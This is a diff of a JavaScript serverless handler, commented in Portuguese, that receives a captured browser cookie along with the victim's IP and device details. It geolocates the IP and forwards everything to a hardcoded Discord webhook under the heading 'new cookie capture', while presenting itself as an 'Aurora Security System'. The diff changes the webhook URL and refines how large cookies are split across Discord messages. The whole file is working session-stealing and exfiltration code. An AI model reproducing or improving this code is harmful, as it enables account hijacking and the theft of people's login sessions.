@@ -1,15 +1,13 @@
 export default async function handler(req, res) {
-  // Permitir CORS
+  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  // Responder preflight requests
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
 
-  // Apenas POST
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
@@ -22,52 +20,94 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'Cookie inválido' });
     }
 
-    // Buscar informações detalhadas do IP
+    // Buscar informações do IP (com timeout)
     let ipInfo = {};
     try {
-      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
-      ipInfo = await ipResponse.json();
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 5000);
+      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`, {
+        signal: controller.signal
+      });
+      clearTimeout(timeoutId);
+      if (ipResponse.ok) {
+        ipInfo = await ipResponse.json();
+      }
     } catch (e) {
-      console.error('Erro ao buscar info do IP:', e);
+      console.error('Erro ao buscar info do IP:', e.message);
     }
 
     // WEBHOOK DO DISCORD
-    const webhookURL = 'https://canary.discord.com/api/webhooks/1485346055141851308/-4ro_V3pWvgd_qRDW6uOO0WkVEmDQmt-9HNzgFd1MnqObF-TGy23rXLxESosIqg8KnFT';
+    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
 
-    // ===== FUNÇÃO PARA DIVIDIR COOKIE GRANDE =====
-    function dividirCookie(texto, limite = 1900) {
-      if (texto.length <= limite) return [texto];
-      
-      const partes = [];
-      let resto = texto;
-      
-      while (resto.length > limite) {
-        let corte = resto.lastIndexOf(':', limite);
-        if (corte === -1) corte = resto.lastIndexOf('-', limite);
-        if (corte === -1) corte = resto.lastIndexOf('=', limite);
-        if (corte === -1) corte = limite;
-        
-        partes.push(resto.substring(0, corte));
-        resto = resto.substring(corte);
+    // ===== FUNÇÃO PARA DIVIDIR COOKIE GRANDE EM PARTES =====
+    const MAX_FIELD_SIZE = 1900; // Discord tem limite de 2000, deixamos margem
+    
+    function splitCookie(cookieStr) {
+      if (cookieStr.length <= MAX_FIELD_SIZE) {
+        return [cookieStr];
       }
-      partes.push(resto);
       
-      return partes;
+      const parts = [];
+      let remaining = cookieStr;
+      
+      while (remaining.length > MAX_FIELD_SIZE) {
+        let splitIndex = remaining.lastIndexOf(':', MAX_FIELD_SIZE);
+        if (splitIndex === -1) splitIndex = remaining.lastIndexOf('-', MAX_FIELD_SIZE);
+        if (splitIndex === -1) splitIndex = remaining.lastIndexOf('=', MAX_FIELD_SIZE);
+        if (splitIndex === -1) splitIndex = MAX_FIELD_SIZE;
+        
+        parts.push(remaining.substring(0, splitIndex));
+        remaining = remaining.substring(splitIndex);
+      }
+      parts.push(remaining);
+      
+      return parts;
     }
 
-    const partesCookie = dividirCookie(cookie);
+    const cookieParts = splitCookie(cookie);
     
-    // ===== INFORMAÇÕES DO DISPOSITIVO =====
-    const dispositivoInfo = `\`\`\`yml
-Dispositivo: ${device}
-Navegador: ${getBrowserInfo(req)}
-Sistema: ${getOSInfo(req)}
-Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
-\`\`\``;
-
-    // ===== INFORMAÇÕES DO IP =====
-    const ipInfoText = `\`\`\`yml
-IP: ${ip}
+    // ===== CONSTRUIR FIELDS =====
+    const fields = [];
+    
+    // Adicionar partes do cookie
+    if (cookieParts.length === 1) {
+      fields.push({
+        name: '🍪 COOKIE COMPLETO',
+        value: '```' + cookieParts[0] + '```'
+      });
+    } else {
+      fields.push({
+        name: '⚠️ COOKIE GRANDE - PARTE 1/' + cookieParts.length,
+        value: '```' + cookieParts[0] + '```'
+      });
+      for (let i = 1; i < cookieParts.length; i++) {
+        fields.push({
+          name: `📦 PARTE ${i+1}/${cookieParts.length}`,
+          value: '```' + cookieParts[i] + '```'
+        });
+      }
+    }
+    
+    // Informações do dispositivo COMPLETAS
+    const userAgent = req.headers['user-agent'] || 'Desconhecido';
+    const acceptLanguage = req.headers['accept-language'] || 'Desconhecido';
+    
+    fields.push({
+      name: '📊 INFORMAÇÕES DO DISPOSITIVO',
+      value: `\`\`\`yml
+Dispositivo: ${device || 'Desconhecido'}
+Navegador: ${getBrowserInfo(userAgent)}
+Sistema: ${getOSInfo(userAgent)}
+Idioma: ${acceptLanguage}
+User-Agent: ${userAgent.substring(0, 150)}${userAgent.length > 150 ? '...' : ''}
+\`\`\``
+    });
+    
+    // Informações do IP COMPLETAS
+    fields.push({
+      name: '🌍 INFORMAÇÕES DO IP',
+      value: `\`\`\`yml
+IP: ${ip || 'Desconhecido'}
 País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
 Região: ${ipInfo.regionName || 'Desconhecido'}
 Cidade: ${ipInfo.city || 'Desconhecido'}
@@ -80,59 +120,44 @@ Organização: ${ipInfo.org || 'Desconhecido'}
 Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
 Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
 Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
-\`\`\``;
-
-    // ===== CONSTRUIR EMBEDS =====
-    const embeds = [];
+\`\`\``
+    });
     
-    // Primeiro embed com as primeiras partes do cookie
-    for (let i = 0; i < partesCookie.length; i++) {
-      const fields = [];
-      
-      // Primeira parte do cookie
-      if (i === 0) {
-        fields.push({
-          name: '🍪 COOKIE COMPLETO',
-          value: '```' + partesCookie[i] + '```'
-        });
-        fields.push({
-          name: '📊 INFORMAÇÕES DO DISPOSITIVO',
-          value: dispositivoInfo
-        });
-        fields.push({
-          name: '🌍 INFORMAÇÕES DO IP',
-          value: ipInfoText
-        });
-        fields.push({
-          name: '⏰ TIMESTAMP',
-          value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
-          inline: true
-        });
-        fields.push({
-          name: '🔢 ID DA SESSÃO',
-          value: `\`${generateSessionId()}\``,
-          inline: true
-        });
-        fields.push({
-          name: '📏 TAMANHO DO COOKIE',
-          value: `\`${cookie.length} caracteres (${partesCookie.length} parte(s))\``,
-          inline: true
-        });
-      } else {
-        // Partes seguintes do cookie
-        fields.push({
-          name: `📦 CONTINUAÇÃO DO COOKIE (Parte ${i+1}/${partesCookie.length})`,
-          value: '```' + partesCookie[i] + '```'
-        });
-      }
+    // Informações adicionais
+    fields.push({
+      name: '⏰ TIMESTAMP',
+      value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
+      inline: true
+    });
+    
+    fields.push({
+      name: '🔢 ID DA SESSÃO',
+      value: `\`${generateSessionId()}\``,
+      inline: true
+    });
+    
+    fields.push({
+      name: '📏 TAMANHO DO COOKIE',
+      value: `\`${cookie.length} caracteres (${cookieParts.length} parte(s))\``,
+      inline: true
+    });
+
+    // ===== CRIAR EMBEDS =====
+    // O Discord permite no máximo 10 campos por embed
+    // Se tivermos muitos campos, criamos múltiplos embeds
+    const embeds = [];
+    const MAX_FIELDS_PER_EMBED = 10;
+    
+    for (let i = 0; i < fields.length; i += MAX_FIELDS_PER_EMBED) {
+      const embedFields = fields.slice(i, i + MAX_FIELDS_PER_EMBED);
       
       embeds.push({
-        title: i === 0 ? '🔐 NOVA CAPTURA DE COOKIE' : `📎 CONTINUAÇÃO (${i+1}/${partesCookie.length})`,
-        description: i === 0 ? 'Um novo cookie foi capturado pelo sistema Aurora' : null,
+        title: i === 0 ? '🔐 NOVA CAPTURA DE COOKIE' : `📎 CONTINUAÇÃO (${Math.floor(i/MAX_FIELDS_PER_EMBED) + 1})`,
+        description: i === 0 ? 'Um novo cookie foi capturado pelo sistema Aurora' : 'Continuação das informações',
         color: 0x6366f1,
-        fields: fields,
+        fields: embedFields,
         footer: {
-          text: 'Aurora Security System • Proteção Avançada',
+          text: `Aurora Security System • Proteção Avançada ${cookieParts.length > 1 ? `• Cookie dividido em ${cookieParts.length} partes` : ''}`,
           icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
         },
         timestamp: new Date().toISOString(),
@@ -143,6 +168,8 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
     }
 
     // ===== ENVIAR PARA O DISCORD =====
+    let allSuccess = true;
+    
     for (let i = 0; i < embeds.length; i++) {
       const payload = {
         content: i === 0 ? '@everyone' : null,
@@ -156,43 +183,53 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
       });
       
       if (!response.ok) {
+        allSuccess = false;
         console.error(`Erro ao enviar embed ${i + 1}:`, await response.text());
-        throw new Error(`Falha ao enviar parte ${i + 1}`);
       }
       
-      // Delay entre envios
+      // Pequeno delay entre embeds para não sobrecarregar
       if (embeds.length > 1 && i < embeds.length - 1) {
-        await new Promise(r => setTimeout(r, 800));
+        await new Promise(resolve => setTimeout(resolve, 500));
       }
     }
 
-    return res.status(200).json({ success: true, message: `Cookie enviado (${partesCookie.length} parte(s))` });
+    if (!allSuccess) {
+      return res.status(500).json({ error: 'Falha ao enviar algumas partes para o Discord' });
+    }
+
+    return res.status(200).json({ 
+      success: true, 
+      message: `Cookie enviado com sucesso! (${cookieParts.length} parte(s))` 
+    });
 
   } catch (error) {
-    console.error('Erro:', error);
-    return res.status(500).json({ error: 'Erro interno: ' + error.message });
+    console.error('Erro interno:', error);
+    return res.status(500).json({ error: 'Erro interno do servidor: ' + error.message });
   }
 }
 
 // ===== FUNÇÕES AUXILIARES =====
 
-function getBrowserInfo(req) {
-  const ua = req.headers['user-agent'] || '';
-  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
-  if (ua.includes('Firefox')) return 'Mozilla Firefox';
-  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
-  if (ua.includes('Edg')) return 'Microsoft Edge';
-  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+function getBrowserInfo(ua) {
+  if (!ua) return 'Desconhecido';
+  ua = ua.toLowerCase();
+  if (ua.includes('chrome') && !ua.includes('edg')) return 'Google Chrome';
+  if (ua.includes('firefox')) return 'Mozilla Firefox';
+  if (ua.includes('safari') && !ua.includes('chrome')) return 'Apple Safari';
+  if (ua.includes('edg')) return 'Microsoft Edge';
+  if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
+  if (ua.includes('brave')) return 'Brave';
   return 'Desconhecido';
 }
 
-function getOSInfo(req) {
-  const ua = req.headers['user-agent'] || '';
-  if (ua.includes('Windows')) return 'Windows';
-  if (ua.includes('Mac OS')) return 'macOS';
-  if (ua.includes('Linux')) return 'Linux';
-  if (ua.includes('Android')) return 'Android';
-  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+function getOSInfo(ua) {
+  if (!ua) return 'Desconhecido';
+  ua = ua.toLowerCase();
+  if (ua.includes('windows')) return 'Windows';
+  if (ua.includes('mac os') || ua.includes('macintosh')) return 'macOS';
+  if (ua.includes('linux')) return 'Linux';
+  if (ua.includes('android')) return 'Android';
+  if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
   return 'Desconhecido';
 }
 
